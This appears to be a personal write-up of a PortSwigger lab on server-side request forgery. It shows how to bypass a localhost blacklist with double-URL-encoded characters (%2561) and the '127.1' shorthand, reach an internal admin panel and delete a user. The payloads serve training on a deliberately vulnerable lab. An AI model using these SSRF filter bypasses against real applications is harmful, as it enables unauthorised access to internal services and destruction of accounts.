
# #PortSwigger 


![[Pasted image 20251213210119.png]]


## Lab Description

This lab has a stock check feature which fetches data from an internal system.

**Objective:** Change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

**Additional Challenge:** The developer has deployed two weak anti-SSRF defenses that need to be bypassed.

---
---


### Step 1: Capture the Stock Check Request

1. In Burp's browser, access the lab
2. Visit a product page
3. Click **Check stock**
4. In Burp Proxy, find the `POST /product/stock` request

**Example request:**
```
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```



---

### Step 2: Test Localhost — Blocked

**Payload:**
```
stockApi=http://localhost/admin
```

**Response:**
![[Pasted image 20251213211303.png]]
- *`localhost` is blocked by the blacklist

---

### Step 3: Bypass Localhost Block



- 1. Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.

**Payload:**
```
http://loc%2561lhost/%2561dmin
```

**Response:**
![[Pasted image 20251213211701.png]]
- *Admin interface accessed!*


---

### Step 4: Delete Carlos

**Find the delete URL in the response:**
```
/admin/delete?username=carlos
```

**Payload to delete carlos:**
```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

![[Pasted image 20251213211852.png]]
User `carlos` deleted!


![[Pasted image 20251213211953.png]]


---

### Step 5: Lab Solved

![[Pasted image 20251213212030.png]]


---
---
